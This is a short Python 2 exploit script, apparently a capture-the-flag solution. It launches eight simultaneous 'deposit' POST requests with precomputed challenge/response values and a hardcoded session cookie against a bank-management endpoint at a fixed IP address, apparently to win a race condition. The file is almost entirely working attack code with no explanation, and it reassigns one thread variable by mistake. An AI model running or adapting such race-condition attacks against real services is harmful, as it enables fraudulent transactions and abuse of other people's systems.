#!/usr/bin/env python
import requests
import thread
import threading
import sys
import os


class thread_exploit(threading.Thread):
    def __init__(self, challenge, response):
        threading.Thread.__init__(self)
        self.response=response
        self.challenge=challenge
    def run(self):
        #print self.challenge
        #print self.response
        cookie = {'session': 'e19ec630219050f6_541d55f5.U2N-IggJ39wUQWAs0O2pqi9VP1A'}
        payload = {'action':'deposit',
                   'amount':'5',
                   'response': self.response,
                   'challenge':self.challenge,
                   }
        r = requests.post('http://54.165.148.27:5000/bank_manage', data=payload, cookies=cookie)
        
        print r.text

thread1 = thread_exploit("9bff18379c86b07ec57aa43cb802f7a534f04442c5f11b7c87722ffdb7a202ce", "4556991")
thread2 = thread_exploit("5fbf185431d462e912b82bd078d55c0fd949c2b122eb1a834cb34c9afad5b80b", "112675")
thread3 = thread_exploit("076cae716db58a39af0c0d992d6b546ba39ebbef813e2a31313ca70f243a59f7", "7537420")
thread4 = thread_exploit("c5843cce0a18bfa1ce05b7da13e3f67cc37b69c8b0454439e097e6ab5695902d", "439434")
thread5 = thread_exploit("71aa33d7a6991030cbadac8849a523dc845b1c9bef222acc96ed0846a78093a0", "883117")
thread6 = thread_exploit("3eea7d9677187eef18971c3aabebadef751e347ab4fc5be232b97ff4b02beef9", "1303411")
thread7 = thread_exploit("91e517e4d30fd3a683c5dd649290cf29fafcf88f80e9aad2dbe320e010da0663", "1261643")
thread8 = thread_exploit("d0c69cc83f3938cd2585bd51058cd19e1ea06f757c1fd1f285ff689952de7200", "1077674")
thread1 = thread_exploit("0fc2092bee920a4b5fe3fc13e71d228953fa3ad093fddd73f541c1a533bec252", "8369490")


thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
thread7.start()
thread8.start()


thread1.join()
thread2.join()
thread3.join()
thread4.join()
thread5.join()
thread6.join()
thread7.join()
thread8.join()